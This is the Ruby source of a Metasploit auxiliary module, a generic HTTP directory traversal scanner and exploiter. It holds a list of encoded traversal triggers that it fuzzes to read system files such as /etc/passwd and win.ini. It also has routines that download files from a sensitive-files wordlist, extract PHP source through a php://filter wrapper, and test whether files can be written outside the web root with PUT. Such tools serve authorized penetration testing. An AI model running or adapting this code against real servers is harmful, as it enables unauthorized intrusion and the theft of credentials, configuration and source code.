##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

#
# Thanks to:
# ipax, neriberto, flambaz, bperry, egypt, and sinn3r for help
#

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::WmapScanUniqueQuery


  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Generic HTTP Directory Traversal Utility',
      'Description'    => %q{
          This module allows you to test if a web server (or web application) is
        vulnerable to directory traversal with three different actions.

          The 'CHECK' action (default) is used to automatically (or manually) find if
        directory traversal exists in the web server, and then return the path that
        triggers the vulnerability.  The 'DOWNLOAD' action shares the same ability as
        'CHECK', but will take advantage of the found trigger to download files based on
        a 'FILELIST' of your choosing.  The 'PHPSOURCE' action can be used to download
        source against PHP applications.  The 'WRITABLE' action can be used to determine
        if the trigger can be used to write files outside the www directory.

          To use the 'COOKIE' option, set your value like so: "name=value".
      },
      'Author'         =>
        [
          'Ewerson Guimaraes(Crash) <crash[at]dclabs.com.br>',
          'Michael Messner <devnull[at]s3cur1ty.de>',
          'et <et[at]cyberspace.org>',
          'sinn3r'
        ],
      'License'        => MSF_LICENSE,
      'Actions'        =>
        [
          ['CHECK',    {'Description' => 'Check for basic directory traversal'}],
          ['WRITABLE', {'Description' => 'Check if a traversal bug allows us to write anywhere'}],
          ['DOWNLOAD', {'Description' => 'Attempt to download files after brute forcing a trigger'}],
          ['PHPSOURCE', {'Description' => 'Attempt to retrieve php source code files'}]
        ],
      'DefaultAction'  => 'CHECK'
    ))

    register_options(
      [
        OptEnum.new('METHOD',    [true, 'HTTP Request Method', 'GET', ['GET', 'POST', 'HEAD', 'PUT']]),
        OptString.new('PATH',    [true, 'Vulnerable path. Ex: /foo/index.php?pg=', '/']),
        OptString.new('DATA',    [false,'HTTP body data', '']),
        OptInt.new('DEPTH',      [true, 'Traversal depth', 5]),
        OptRegexp.new('PATTERN', [true, 'Regexp pattern to determine directory traversal', '^HTTP/\\d\\.\\d 200']),
        OptPath.new(
          'FILELIST',
          [
            true,
            'Wordlist file to brute force',
            File.join(Msf::Config.install_root, 'data', 'wordlists', 'sensitive_files.txt')
          ])
      ])

    register_advanced_options(
      [
        # We favor automatic
        OptString.new('TRIGGER',   [false,'Trigger string. Ex: ../', '']),
        OptString.new('FILE',      [false, 'Default file to read for the fuzzing stage', '']),
        OptString.new('COOKIE',    [false, 'Cookie value to use when sending the requests', ''])
      ])
  end


  # Avoids writing to datastore['METHOD'] directly
  def http_method
    @http_method || datastore['METHOD']
  end

  # Avoids writing to datastore['DATA'] directly
  def data
    @data || datastore['DATA']
  end


  #
  # The fuzz() function serves as the engine for the module.  It can intelligently mutate
  # a trigger, and find potential bugs with it.
  #
  def fuzz
    # Possible triggers
    triggers =
      [
        "../", ".../", "..\\", ".\\..\\", "..///", ".\\./", ".//..//",
        ".%2e./", "%2e%2e/", "..%5c", "..%2f","..%c0%af.."
      ]

    # Initialize the default file(s) we should try to read during fuzzing
    if datastore['FILE'].empty?
      file_to_read = ['etc/passwd', 'boot.ini', 'windows\\win.ini']
    else
      file_to_read = [datastore['FILE']]
    end

    # Each possible trigger, we try to traverse multiple levels down depending
    # on datastore['DEPATH']
    depth = datastore['DEPTH']
    triggers.each do |base|
      1.upto(depth) do |d|
        file_to_read.each do |f|
          trigger = base * d
          p = normalize_uri(datastore['PATH']) + trigger + f
          req = ini_request(p)
          vprint_status("Trying: http://#{rhost}:#{rport}#{p}")
          res = send_request_cgi(req, 25)
          return trigger if res and res.to_s =~ datastore['PATTERN']
        end
      end
    end

    return nil
  end

  #
  # This method will build the HTTP request based on what the user gives us
  #
  def ini_request(uri)
    req = {}

    case http_method
    when 'GET'
      # Example: Say we have the following datastore['PATH']
      # '/test.php?page=1&id=3&note=whatever'
      # We expect it to regex the GET parameters:
      # 'page=1&id=3&note=whatever'
      # And then let queryparse() to handle the rest
      query_params = uri.match(/\?(\w+=.+&*)$/)
      req['vars_get'] = queryparse(query_params[1]) if query_params
    when 'POST'
      req['vars_post'] = queryparse(data) if not data.empty?
    when 'PUT'
      req['data'] = data if not data.empty?
    when 'HEAD'
    end

    if not req['vars_get'].nil? or not req['vars_post'].nil? or not req['data'].nil?
      begin
        this_path = URI(uri).path
      rescue ::URI::InvalidURIError
        this_path = uri.scan(/^(.+)\?*.*/).flatten[0]
      end
    else
      this_path = uri
    end

    req['method']     = http_method
    req['uri']        = this_path
    req['headers']    = {'Cookie'=>datastore['COOKIE']} if not datastore['COOKIE'].empty?
    req['data']       = data if not data.empty?
    req['authorization'] = basic_auth(datastore['HttpUsername'], datastore['HttpPassword'])

    return req
  end

  #
  # Determine if we should automatically fuzz a trigger, or use the user-supplied one
  #
  def ini_trigger
    return datastore['TRIGGER'] if not datastore['TRIGGER'].empty?

    trigger = fuzz
    if trigger.nil?
      print_error("No trigger found")
    else
      print_good("Found trigger: #{trigger}")
    end

    return trigger
  end

  #
  # Action 'CHECK': Find the trigger either automatically using fuzz(), or manually by
  # setting the TRIGGER and FILE option
  #
  def check(trigger)
    if datastore['TRIGGER'].empty?
      # Found trigger using fuzz()
      found = true if trigger
      uri = normalize_uri(datastore['PATH']) + trigger
    else
      # Manual check. meh.
      if datastore['FILE'].empty?
        print_error("Must specify a 'FILE' to check manually")
        return
      end

      uri = normalize_uri(datastore['PATH']) + trigger + datastore['FILE']
      req = ini_request(uri)
      vprint_status("Trying: http://#{rhost}:#{rport}#{uri}")
      res = send_request_cgi(req, 25)
      found = true if res and res.to_s =~ datastore['PATTERN']
    end

    # Reporting
    if found
      print_good("Directory traversal found: #{trigger}")

      report_web_vuln({
        :host     => rhost,
        :port     => rport,
        :vhost    => datastore['VHOST'],
        :path     => uri,
        :params   => normalize_uri(datastore['PATH']),
        :pname    => trigger,
        :risk     => 3,
        :proof    => trigger,
        :name     => self.fullname,
        :category => "web",
        :method   => http_method
      })

    else
      print_error("No directory traversal detected")
    end
  end

  #
  # Action 'DOWNLOAD': Used to download a file with a directory traversal
  #
  def lfi_download(trigger, files)
    counter = 0
    files.each_line do |f|
      # Our trigger already puts us in '/', so our filename doesn't need to begin with that
      f = f[1,f.length] if f =~ /^\//

      req = ini_request(uri = (normalize_uri(datastore['PATH']) + trigger + f).chop)
      res = send_request_cgi(req, 25)

      vprint_status("#{res.code.to_s} for http://#{rhost}:#{rport}#{uri}") if res

      # Only download files that are within our interest
      if res and res.to_s =~ datastore['PATTERN']
        # We assume the string followed by the last '/' is our file name
        fname = f.split("/")[-1].chop
        loot = store_loot("lfi.data","text/plain",rhost, res.body,fname)
        print_good("File #{fname} downloaded to: #{loot}")
        counter += 1
      end
    end
    print_status("#{counter.to_s} file(s) downloaded")
  end


  #
  # Action 'PHPSOURCE': Used to grab the php source code
  #
  def php_download(files)
    counter = 0
    files.each_line do |f|
      # Our trigger already puts us in '/', so our filename doesn't need to begin with that
      f = f[1,f.length] if f =~ /^\//

      req = ini_request(uri = (normalize_uri(datastore['PATH']) + "php://filter/read=convert.base64-encode/resource=" + f).chop)
      res = send_request_cgi(req, 25)

      vprint_status("#{res.code.to_s} for http://#{rhost}:#{rport}#{uri}") if res

      # We assume the string followed by the last '/' is our file name
      fname = f.split("/")[-1].chop
      loot = store_loot("php.data","text/plain",rhost,Rex::Text.decode_base64(res.body),fname)
      print_good("File #{fname} downloaded to: #{loot}")
      counter += 1
    end
    print_status("#{counter.to_s} source code file(s) downloaded")
  end


  #
  # Action 'WRITABLE': This method will attempt to write to a directory outside of www
  #
  def is_writable(trigger)
    # Modify some registered options for the PUT method
    tmp_method = http_method
    tmp_data   = data
    @http_method = 'PUT'

    if data.empty?
      unique_str = Rex::Text.rand_text_alpha(4) * 4
      @data = unique_str
    else
      unique_str = data
    end

    # Form the PUT request
    fname = Rex::Text.rand_text_alpha(rand(5) + 5) + '.txt'
    uri = normalize_uri(datastore['PATH']) + trigger + fname
    vprint_status("Attempt to upload to: http://#{rhost}:#{rport}#{uri}")
    req = ini_request(uri)

    # Upload our unique string, don't care much about the response
    send_request_cgi(req, 25)

    # Prepare request to read our file
    @http_method = 'GET'
    @data   = tmp_data
    req = ini_request(uri)
    vprint_status("Verifying upload...")
    res = send_request_cgi(req, 25)

    # Did we get it?
    if res and res.body =~ /#{unique_str}/
      print_good("WRITE is possible on #{rhost}:#{rport}")
    else
      print_error("WRITE seems unlikely")
    end

    # Ah, don't forget to restore our method
    @http_method = tmp_method
  end

  #
  # Load the whole file list
  # This is used in the lfi_download() function
  #
  def load_filelist
    File.open(datastore['FILELIST'], 'rb') {|f| f.read}
  end

  def run_host(ip)
    # Warn if it's not a well-formed UPPERCASE method
    if http_method !~ /^[A-Z]+$/
      print_warning("HTTP method #{http_method} is not Apache-compliant. Try only UPPERCASE letters.")
    end
    print_status("Running action: #{action.name}...")

    # And it's..... "SHOW TIME!!"
    if action.name == 'CHECK'
      trigger = ini_trigger
      return if trigger.nil?
      check(trigger)

    elsif action.name == 'WRITABLE'
      trigger = ini_trigger
      return if trigger.nil?
      is_writable(trigger)

    elsif action.name == 'PHPSOURCE'
      trigger = ini_trigger
      return if trigger.nil?
      files = load_filelist
      php_download(files)

    elsif action.name == 'DOWNLOAD'
      trigger = ini_trigger
      return if trigger.nil?

      # Load up a file list that we wish to download, and then attempt to download them
      # with our directory traversal trigger
      files = load_filelist
      lfi_download(trigger, files)
    end
  end
end
